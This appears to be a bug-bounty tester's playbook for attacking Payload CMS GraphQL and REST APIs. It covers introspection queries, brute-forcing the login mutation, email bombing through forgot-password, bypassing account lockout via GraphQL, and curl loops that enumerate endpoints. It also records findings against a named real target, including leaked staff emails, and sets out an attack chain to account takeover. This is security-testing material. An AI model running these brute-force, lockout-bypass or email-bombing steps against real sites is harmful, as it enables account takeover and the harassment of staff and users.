# Payload CMS — GraphQL Attack Patterns

**Origin session:** Origin Energy / MyConnect 2026-09-03.  
**Tech:** Payload CMS (headless CMS) with built-in GraphQL API at `/api/graphql`.

---

## Default Attack Surface

Payload CMS ships with a GraphQL API that, **by default**, exposes:

1. **Full introspection** — `__schema` query returns ALL types, mutations, queries
2. **Login mutation** — `loginUser(email, password)` accessible without auth
3. **Forgot-password mutation** — `forgotPasswordUser(email)` accessible without auth
4. **Public queries** — Images, Quotes, CustomPages, Redirects often readable without auth
5. **User type schema** — Exposes field names like `hash`, `salt`, `resetPasswordToken`, `resetPasswordExpiration`, `loginAttempts`, `lockUntil`

### Key Finding: Schema Disclosure
Even when `Users` query returns 403, the **introspection itself leaks**:
- Exact field names on User type (hash, salt, resetPasswordToken)
- All available mutations (login, forgotPassword, resetPassword)
- All collection types and their relationships

This is a ** CWE-200 (Information Exposure)** finding — the schema reveals the authentication architecture and sensitive field names to unauthenticated attackers.

---

## Exploitation Checklist

### 1. Introspection Enumeration
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
    mutationType {
      fields {
        name
        args { name type { name } }
      }
    }
    queryType {
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
```

### 2. Login Mutation Testing
```graphql
mutation {
  loginUser(email: "target@email.com", password: "test") {
    exp
    token
    user { email id }
  }
}
```
**Test for:**
- No rate limiting (rapid brute force)
- Error message differences for valid vs invalid emails
- Token format (JWT? Payload-specific?)

### 3. Forgot Password Abuse
```graphql
mutation {
  forgotPasswordUser(email: "victim@email.com")
}
```
**Returns `true` for ALL emails** (including nonexistent). This enables:
- **Email bombing** — flood any address with reset emails
- **No rate limiting** — unlimited requests

### 4. Staging Environment Mirror
Check for staging variants:
- `portal-cms.staging.TARGET.com.au/api/graphql`
- `cms-staging.TARGET.com/api/graphql`
- `staging-cms.TARGET.com/api/graphql`

Staging often has:
- Same introspection enabled
- Same login/forgot-password mutations
- Additional debug information
- Weaker or no rate limiting

---

## Severity Assessment

| Finding | Severity | VRT Mapping |
|---------|----------|-------------|
| GraphQL introspection enabled on production | P3-P4 Medium | A05: Security Misconfiguration |
| Login mutation no rate limiting | P3 Medium | A07: Identity & Auth Failures |
| Email bombing via forgotPassword | P3 Medium | A04: Insecure Design |
| Staging CMS publicly accessible | P3-P4 Medium | A05: Security Misconfiguration |
| User type schema exposes hash/salt fields | P4 Low | A02: Cryptographic Failures |

**Escalation paths:**
- If brute force succeeds → P1 Critical (account takeover)
- If reset token leakage via IDOR → P2 High (account takeover)
- If staging has debug creds → P2 High (lateral movement to production)

---

## Account Lockout Bypass (Portal Login vs GraphQL)

**Critical pattern discovered:** Payload CMS portal may enforce account lockout on the login form, but the GraphQL `loginUser` mutation does NOT enforce the same lockout.

**Evidence (MyConnect 2026-09-04):**
- Portal form: 3 failed attempts → 30-minute lockout (`"Your account has been locked. Please try again in 30 minutes."`)
- GraphQL `loginUser` mutation: 30 rapid attempts → ALL processed, zero lockout
- User type schema reveals `loginAttempts` and `lockUntil` fields — lockout logic exists but isn't enforced on GraphQL

**Attack chain:**
1. Enumerate staff emails via `__NEXT_DATA__` or other info disclosure
2. Lock the account via portal form (3 attempts)
3. Bypass lockout via GraphQL mutation (unlimited attempts)
4. Full brute force with no protection

**Why this matters:** Lockout is a defense-in-depth control. If one endpoint enforces it and another doesn't, the protection is effectively bypassed.

**Severity:** P3 Medium (brute force amplification) → P1 Critical if brute force succeeds (account takeover)

**VRT mapping:** A07: Identity & Auth Failures → Broken Authentication

---

## Admin Panel Public Access

Payload CMS admin UI is often publicly accessible at `/admin`:

```bash
# Check admin panel
curl -sI "https://TARGET.com/admin/login"  # 200 = accessible
curl -sI "https://TARGET.com/admin/forgot"  # 200 = accessible

# Check admin forgot password form
curl -s "https://TARGET.com/admin/forgot" | grep -oP 'action="[^"]*"'
# May reveal: action="/api/users/forgot-password"
```

**MyConnect findings:**
- `/admin/login` — 200 OK, title "Login - Payload", 182KB HTML
- `/admin/forgot` — 200 OK, posts to `/api/users/forgot-password`
- No IP restriction, no VPN requirement, no CAPTCHA on forgot password

**Testing the admin forgot-password endpoint:**
```bash
# Rate limit test — send 10 rapid requests
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "https://TARGET.com/api/users/forgot-password" \
    -H "Content-Type: application/json" -d '{"email":"test@test.com"}'
done
# If all return 200 → no rate limiting → email bombing possible
```

**Severity:** P4 Low (admin panel accessible) → P3 Medium if no rate limiting on forgot-password (email bombing)

---

## Public vs Private Collection Enumeration

After introspection, systematically test each collection for public access:

```bash
# Test common Payload CMS collection endpoints
for col in users images quotes custom-pages redirects retailers people orders; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET.com/api/${col}")
  echo "[$code] /api/${col}"
done
```

**MyConnect results:**
- `images` — 200 (public, 320+ items)
- `quotes` — 200 (public)
- `custom-pages` — 200 (public)
- `redirects` — 200 (public, reveals full redirect map)
- `retailers` — 403 (protected)
- `people` — 403 (protected)

**Key insight:** Public collections may contain:
- Internal document IDs (useful for IDOR testing)
- File metadata (URLs, sizes, creation dates)
- Business data (quotes, pages, redirects)

---

## By-Design Considerations

**Arguments FOR by-design:**
- GraphQL introspection is a developer convenience feature
- Forgot-password returning true for all emails prevents enumeration (good practice)
- Staging environments may be intentionally accessible for partners
- Admin panel may need to be accessible for content editors without VPN

**Arguments AGAINST by-design (strengthens finding):**
- Production environment should disable introspection
- No rate limiting on login/forgot-password is a configuration oversight
- Staging with same attack surface as production increases risk
- Schema reveals internal auth architecture (hash/salt field names)
- Account lockout bypass via GraphQL undermines portal security controls
- Admin panel with no IP restriction exposes attack surface to all internet users

**Recommended severity:** P3 Medium for the combination of introspection + no rate limiting + lockout bypass.

---

## Mutation Error-Based Field Enumeration (NEW — 2026-09-05)

Even when a mutation is access-controlled (403), you can enumerate its **return type fields** by querying with wrong field names first.

### Technique: Two-Phase Probe

**Phase 1 — Wrong field name (schema leak):**
```graphql
mutation {
  createUser(data: {email: "test@test.com", password: "test1234"}) {
    exp
    token
    user { email id }
  }
}
```
Response: `"Cannot query field 'exp' on type 'User'"`
→ Reveals: return type is `User`, and `exp` is NOT a field on it.

**Phase 2 — Correct field names (access check):**
```graphql
mutation {
  createUser(data: {email: "test@test.com", password: "test1234"}) {
    token
    user { email id }
  }
}
```
Response: `"You are not allowed to perform this action."` (403)
→ Confirms: access control works, but schema was already leaked in Phase 1.

**Key distinction:**
- `Cannot query field 'X' on type 'Y'` = **schema error** (field doesn't exist on type)
- `You are not allowed` / `Not authenticated` = **access control** (auth/permission check)
- If Phase 1 returns an access error instead of a field error → the mutation is fully blocked (no schema leak)

**Why this matters:** Even fully locked mutations reveal their response shape. This tells an attacker what data WOULD be returned if they bypass auth — useful for:
- Identifying which mutations return tokens (auth bypass targets)
- Mapping User type fields (hash, salt, etc.) when introspection is disabled
- Understanding mutation relationships (e.g., `createUser` returns `User` type → same fields as `Users` query)

**Severity:** Combined with introspection being disabled, this is P4 Low (partial schema disclosure). With introspection enabled, it's redundant (introspection already leaks everything).

---

## Global Pages Pattern

Payload CMS "Global" pages (singletons like `activityPage`, `settings`, `footer`) are NOT in the GraphQL Query root:

```graphql
query {
  activityPage { ... }  # ERROR: Cannot query field 'activityPage' on type Query
}
```

**Test via REST instead:**
```bash
# Enumerate globals from introspection (look for GlobalConfig, *_Globals types)
curl -s -X POST "https://TARGET.com/api/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"Query\") { fields { name } } }"}' | python3 -m json.tool

# Then test REST endpoints
for slug in activityPage settings footer header navigation; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET.com/api/globals/${slug}")
  echo "[$code] /api/globals/${slug}"
done
```

**Common globals:** activityPage, settings, footer, header, navigation, siteConfig, theme
**Risk:** May leak internal configuration, feature flags, or admin settings.

---

## `/api/access` Permission Endpoint

Payload CMS exposes collection permission metadata:

```bash
curl -s "https://TARGET.com/api/access" | python3 -m json.tool
```

Returns a JSON object mapping collection names to their access permissions (read/write/admin). Useful for:
- Understanding which collections are public vs protected
- Identifying permission misconfigurations
- Mapping the full data model without introspection

**Severity:** P4 Low (information disclosure) — reveals access control configuration.

---

## Complementary Tests

After finding Payload CMS GraphQL:
1. **Check REST API** — `/api/{collection}` endpoints (CRUD without auth)
2. **Check admin panel** — `/admin` (Payload CMS admin UI)
3. **Check image URLs** — `/api/images/{id}` (may leak file metadata)
4. **Check for SQLi/NoSQLi** — injection in GraphQL arguments
5. **Check for IDOR** — sequential document IDs in queries
6. **Check for mass assignment** — extra fields in mutations
7. **Check `/api/access`** — permission metadata disclosure
8. **Check `/api/globals/[slug]`** — global page data (settings, config)
9. **Mutation error probing** — enumerate return types on locked mutations

---

## Payload CMS Version Detection

```bash
# Check package.json
curl -s "https://TARGET.com/admin/package.json" 2>/dev/null | grep payload

# Check API response headers
curl -sI "https://TARGET.com/api/graphql" | grep -i "x-powered\|server"

# Check admin panel
curl -s "https://TARGET.com/admin/" | grep -oP 'payload[^"]*version[^"]*"[^"]*"'
```

---

## Real-World Example (MyConnect)

**Target:** `portal-cms.myconnect.com.au` (Origin Energy subsidiary)  
**Findings (6 verified, 2026-09-04):**
1. **GraphQL introspection fully enabled** — User type exposes hash, salt, resetPasswordToken, loginAttempts, lockUntil fields
2. **`loginUser` mutation accessible without auth** — 30 rapid attempts, zero lockout, zero rate limiting
3. **`forgotPasswordUser` returns true for ALL emails** — email bombing possible, no rate limiting on REST endpoint
4. **`__NEXT_DATA__` info disclosure** — 21 staff emails, MongoDB User IDs, password policy (min 8 chars), lockout config (maxAttempts: 3, lockDuration: 1800000ms), internal URLs (AWS, Google, Atlassian, New Relic), buildId
5. **Account lockout bypass** — Portal form locks after 3 attempts (30-min), GraphQL mutation does NOT enforce lockout
6. **Admin panel publicly accessible** — `/admin/login` (200 OK), `/admin/forgot` (200 OK), no IP restriction
7. **Public collection enumeration** — images, quotes, custom-pages, redirects accessible; retailers, people blocked (403)

**Attack chain proven:**
```
__NEXT_DATA__ leak → staff emails → GraphQL brute force (no lockout) → account takeover
```

**Root cause:** Payload CMS default configuration doesn't disable introspection, add rate limiting, or enforce consistent lockout across all auth endpoints.
